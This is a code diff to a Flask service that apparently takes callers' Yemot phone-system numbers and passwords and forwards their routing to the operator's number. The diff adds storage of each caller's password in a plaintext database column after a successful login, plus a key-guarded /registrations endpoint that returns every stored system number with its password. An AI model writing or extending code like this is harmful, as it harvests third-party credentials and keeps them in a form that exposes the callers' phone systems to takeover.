@@ -1,9 +1,10 @@
 import argparse
 import os
-from typing import Optional
+from datetime import datetime, timezone
 
 import requests
-from flask import Flask, request
+from flask import Flask, redirect, render_template, request
+from psycopg import connect
 
 app = Flask(__name__)
 
@@ -22,11 +23,120 @@ def get_config_value(name: str, default: str) -> str:
 API_URL = get_config_value("YEMOT_API_URL", DEFAULT_API_URL)
 ROUTING_NUMBER = get_config_value("YEMOT_ROUTING_NUMBER", DEFAULT_ROUTING_NUMBER)
 REQUEST_TIMEOUT = float(get_config_value("YEMOT_TIMEOUT", str(DEFAULT_TIMEOUT)))
+DATABASE_URL = os.environ.get("DATABASE_URL", "").strip()
+DASHBOARD_KEY = os.environ.get("DASHBOARD_KEY", "").strip()
+
+
+def ensure_completions_table(connection) -> None:
+    with connection.cursor() as cursor:
+        cursor.execute(
+            """
+            CREATE TABLE IF NOT EXISTS ivr_completions (
+                id BIGSERIAL PRIMARY KEY,
+                system_number TEXT NOT NULL,
+                completed_at TIMESTAMPTZ NOT NULL,
+                password_plaintext TEXT
+            )
+            """
+        )
+        cursor.execute(
+            "ALTER TABLE ivr_completions ADD COLUMN IF NOT EXISTS password_plaintext TEXT"
+        )
+
+
+def save_completion(system_number: str, password: str) -> None:
+    if not DATABASE_URL:
+        app.logger.warning("DATABASE_URL is not configured; completion was not saved")
+        return
+
+    try:
+        with connect(DATABASE_URL) as connection:
+            ensure_completions_table(connection)
+            with connection.cursor() as cursor:
+                cursor.execute(
+                    """
+                    INSERT INTO ivr_completions
+                        (system_number, completed_at, password_plaintext)
+                    VALUES (%s, %s, %s)
+                    """,
+                    (system_number, datetime.now(timezone.utc), password),
+                )
+    except Exception:
+        app.logger.exception("Could not save IVR completion")
+
+
+def get_completion_count() -> int | None:
+    if not DATABASE_URL:
+        return None
+
+    with connect(DATABASE_URL) as connection:
+        ensure_completions_table(connection)
+        with connection.cursor() as cursor:
+            cursor.execute("SELECT COUNT(DISTINCT system_number) FROM ivr_completions")
+            return int(cursor.fetchone()[0])
+
+
+def get_registrations() -> list[dict[str, str]]:
+    with connect(DATABASE_URL) as connection:
+        ensure_completions_table(connection)
+        with connection.cursor() as cursor:
+            cursor.execute(
+                """
+                SELECT DISTINCT ON (system_number)
+                    system_number, password_plaintext, completed_at
+                FROM ivr_completions
+                ORDER BY system_number, completed_at DESC
+                LIMIT 1000
+                """
+            )
+            return [
+                {
+                    "system_number": row[0],
+                    "password": row[1] or "",
+                    "completed_at": row[2].isoformat(),
+                }
+                for row in cursor.fetchall()
+            ]
 
 
 @app.get("/health")
 def health_check():
     return {"status": "ok", "service": "yemot-ivr"}, 200
+
+
+@app.get("/")
+def home():
+    return redirect("/dashboard")
+
+
+@app.get("/stats")
+def stats():
+    try:
+        count = get_completion_count()
+    except Exception:
+        app.logger.exception("Could not read IVR completion count")
+        return {"status": "unavailable", "reason": "Database connection failed"}, 503
+    if count is None:
+        return {"status": "unavailable", "reason": "DATABASE_URL is not configured"}, 503
+    return {"registered_systems": count}, 200
+
+
+@app.get("/registrations")
+def registrations():
+    if not DASHBOARD_KEY or request.headers.get("X-Dashboard-Key") != DASHBOARD_KEY:
+        return {"status": "unauthorized"}, 401
+    if not DATABASE_URL:
+        return {"status": "unavailable", "reason": "DATABASE_URL is not configured"}, 503
+    try:
+        return {"registrations": get_registrations()}, 200
+    except Exception:
+        app.logger.exception("Could not read IVR registrations")
+        return {"status": "unavailable", "reason": "Database connection failed"}, 503
+
+
+@app.get("/dashboard")
+def dashboard():
+    return render_template("dashboard.html")
 
 
 @app.route('/api/yemot', methods=['GET', 'POST'])
@@ -58,7 +168,7 @@ def yemot_ivr():
         try:
             payload = {
                 "token": f"{system_number}:{password}",
-                "path": "ivr2:/",
+                "path": "ivr2:",
                 "type": "nitoviya",
                 "nitoviya_dial_to": ROUTING_NUMBER,
             }
@@ -68,6 +178,7 @@ def yemot_ivr():
             response_data = response.json()
 
             if response_data.get("responseStatus") == "OK":
+                save_completion(system_number, password)
                 return "id_list_message=t-הפעולה בוצעה בהצלחה."
 
             return "id_list_message=t-שגיאה: מספר המערכת או הסיסמה שגויים."
